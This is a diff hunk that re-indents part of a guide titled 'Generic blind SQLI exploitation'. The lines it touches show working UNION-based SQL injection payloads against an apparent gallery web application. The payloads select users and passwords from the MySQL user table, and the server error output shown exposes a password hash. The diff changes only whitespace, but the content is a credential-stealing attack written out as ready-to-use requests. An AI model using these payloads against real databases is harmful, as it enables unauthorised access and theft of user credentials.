@@ -90,10 +90,10 @@ Generic blind SQLI exploitation
     ...*
     You can get the name of the database by sending:
     *?id=1 union all select 1,2,3,4,5 from XXX
- Table 'gallery.XXX' doesn't existCould not select category*
- You can use a comment *#* to finish the query, in case there is a group by after the context of the injection. You can select the users and passwords form the database with:
- *id=1+union+all+(select+1,2,3,4,5,6+from+mysql.user)%23*
+Table 'gallery.XXX' doesn't existCould not select category*
+    You can use a comment *#* to finish the query, in case there is a group by after the context of the injection. You can select the users and passwords form the database with:
+    *id=1+union+all+(select+1,2,3,4,5,6+from+mysql.user)%23*
 
- Leak the password:
- *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
+    Leak the password:
+    *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
